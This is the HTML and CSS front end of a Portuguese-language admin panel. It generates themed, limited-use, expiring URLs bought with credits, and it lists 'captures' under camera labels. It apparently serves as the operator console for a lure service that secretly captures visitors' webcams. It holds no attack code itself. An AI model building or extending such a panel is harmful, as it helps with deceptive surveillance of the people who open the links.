<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Painel Admin</title>

<style>

/* RESET */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', sans-serif;
}

/* BODY */
body {
    background: #0f172a;
    color: #e2e8f0;
}

/* LOGIN */
.login-container {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
}

.login-card {
    background: #1e293b;
    padding: 40px;
    border-radius: 16px;
    text-align: center;
    width: 320px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
}

.google-btn {
    margin-top: 20px;
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg,#667eea,#764ba2);
    color: white;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
}

.google-btn:hover {
    transform: scale(1.03);
}

/* MAIN */
.hidden {
    display: none;
}

#mainPanel {
    padding: 20px;
}

/* HEADER */
.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: #1e293b;
    padding: 15px 20px;
    border-radius: 14px;
    margin-bottom: 20px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.3);
}

.user-info {
    display: flex;
    align-items: center;
    gap: 10px;
}

.credits {
    background: #020617;
    padding: 6px 10px;
    border-radius: 8px;
    font-size: 13px;
}

.user-avatar {
    width: 35px;
    height: 35px;
    border-radius: 50%;
    border: 2px solid #3b82f6;
}

.logout-btn {
    background: #ef4444;
    border: none;
    padding: 8px 12px;
    border-radius: 8px;
    color: white;
    cursor: pointer;
}

/* CARDS */
.card {
    background: #1e293b;
    padding: 20px;
    border-radius: 16px;
    margin-bottom: 20px;
    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
}

.card h2 {
    margin-bottom: 15px;
}

/* FORM */
.form-row {
    display: flex;
    gap: 15px;
    margin-bottom: 15px;
    flex-wrap: wrap;
}

.form-group {
    flex: 1;
    display: flex;
    flex-direction: column;
    min-width: 200px;
}

.form-group label {
    font-size: 13px;
    margin-bottom: 5px;
    color: #94a3b8;
}

input, select, textarea {
    padding: 10px;
    border-radius: 8px;
    border: none;
    background: #020617;
    color: white;
    outline: none;
}

input:focus, select:focus, textarea:focus {
    border: 1px solid #3b82f6;
}

/* BOTÃO */
.generate-btn {
    width: 100%;
    padding: 14px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(135deg,#22c55e,#16a34a);
    color: white;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
    transition: 0.3s;
}

.generate-btn:hover {
    transform: scale(1.02);
}

/* URL */
.generated-url {
    margin-top: 15px;
}

.url-display {
    display: flex;
    gap: 10px;
}

.url-input {
    flex: 1;
}

.copy-btn {
    padding: 10px;
    border: none;
    border-radius: 8px;
    background: #3b82f6;
    color: white;
    cursor: pointer;
}

/* LISTAS */
.urls-list, .captures-list {
    background: #020617;
    padding: 15px;
    border-radius: 10px;
    min-height: 120px;
}

/* LOADING */
.loading {
    text-align: center;
    color: #94a3b8;
}

.spinner {
    width: 30px;
    height: 30px;
    border: 3px solid #1e293b;
    border-top: 3px solid #3b82f6;
    border-radius: 50%;
    margin: 0 auto 10px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}

/* PREVIEW */
.theme-preview {
    margin-top: 15px;
    padding: 15px;
    border-radius: 12px;
    background: linear-gradient(135deg,#667eea,#764ba2);
    text-align: center;
    transition: 0.3s;
}

.theme-preview img {
    max-width: 100%;
    border-radius: 10px;
    margin-top: 10px;
}

/* RESPONSIVO */
@media (max-width: 768px) {
    .form-row {
        flex-direction: column;
    }

    .header {
        flex-direction: column;
        gap: 10px;
    }
}

</style>
</head>

<body>

<!-- LOGIN -->
<div id="loginScreen" class="login-container">
    <div class="login-card">
        <h1></h1>
        <p>Painel Administrativo</p>
        <button id="googleLoginBtn" class="google-btn">
            🔍 Entrar com Google
        </button>
    </div>
</div>

<!-- PAINEL -->
<div id="mainPanel" class="hidden">

    <div class="header">
        <h1>Painel Admin</h1>

        <div class="user-info">
            <div class="credits" id="creditsDisplay">Créditos: 0</div>
            <img id="userAvatar" class="user-avatar" src="">
            <span id="userName"></span>
            <button id="logoutBtn" class="logout-btn">Sair</button>
        </div>
    </div>

    <!-- GERADOR -->
    <div id="generator" class="tab-content active">
        <div class="card">
            <h2>🔗 Gerar Nova URL</h2>

            <div class="url-generator">

                <div class="form-row">
                    <div class="form-group">
                        <label>Nome da Campanha:</label>
                        <input type="text" id="campaignName">
                    </div>

                    <div class="form-group">
                        <label>Máximo de Usos:</label>
                        <select id="maxUses"></select>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label>Expirar em:</label>
                        <select id="expirationTime"></select>
                    </div>

                    <div class="form-group">
                        <label>Status Inicial:</label>
                        <select id="initialStatus"></select>
                    </div>
                </div>

                <div class="form-group">
                    <label>🎨 Personalização do Tema:</label>

                    <div class="form-row">
                        <div class="form-group">
                            <label>Título da Página:</label>
                            <input type="text" id="themeTitle">
                        </div>

                        <div class="form-group">
                            <label>URL da Imagem:</label>
                            <input type="url" id="themeImageUrl">
                        </div>
                    </div>

                    <div class="form-group">
                        <label>Descrição:</label>
                        <textarea id="themeDescription"></textarea>
                    </div>

                    <div class="form-row">
                        <div class="form-group">
                            <label>Cor do Tema:</label>
                            <select id="themeColor"></select>
                        </div>

                        <div class="form-group">
                            <label>Câmera:</label>
                            <select id="themeEmoji"></select>
                        </div>
                    </div>

                    <div class="theme-preview" id="themePreview">
                        <div style="font-size:2em;" id="previewEmoji">🩴</div>
                        <h3 id="previewTitle">🩴 Sandálias Retrô</h3>
                        <img id="previewImage" style="display:none;">
                        <p id="previewDescription"></p>
                    </div>
                </div>

                <button id="generateUrlBtn" class="generate-btn">
                    Gerar URL (Custa 1 crédito)
                </button>

                <div id="generatedUrlSection" class="generated-url">
                    <div class="url-display">
                        <input id="generatedUrlInput" class="url-input" readonly>
                        <button id="copyUrlBtn" class="copy-btn">Copiar</button>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- LISTAS -->
    <div class="card">
        <h2>📋 URLs Geradas</h2>
        <div id="urlsList" class="urls-list">
            <div class="loading">
                <div class="spinner"></div>
                Carregando URLs...
            </div>
        </div>
    </div>

    <div class="card">
        <h2>📹 Capturas Realizadas</h2>
        <div id="capturesList" class="captures-list">
            <div class="loading">
                <div class="spinner"></div>
                Carregando capturas...
            </div>
        </div>
    </div>

</div>

<!-- Firebase -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-app-compat.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-auth-compat.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/9.23.0/firebase-database-compat.min.js"></script>

<script type="module" src="app/main.js"></script>

</body>
</html>
